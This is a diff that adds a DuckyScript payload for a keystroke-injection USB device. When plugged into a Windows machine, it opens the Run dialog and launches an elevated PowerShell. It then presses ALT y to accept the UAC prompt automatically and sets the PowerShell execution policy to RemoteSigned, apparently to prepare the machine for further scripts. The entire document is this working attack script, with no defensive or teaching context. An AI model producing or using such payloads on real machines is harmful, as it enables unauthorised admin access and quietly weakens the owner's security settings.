@@ -1,0 +1,20 @@
+REM ######## Open Run ########
+DELAY 1000
+GUI r
+DELAY 100
+
+REM ######## Run Powershell as Admin ########
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM ######## Make script executable on Powershell ########
+STRING set-executionpolicy remotesigned
+ENTER
+DELAY 500
+STRING y
+ENTER
+STRING exit
+ENTER
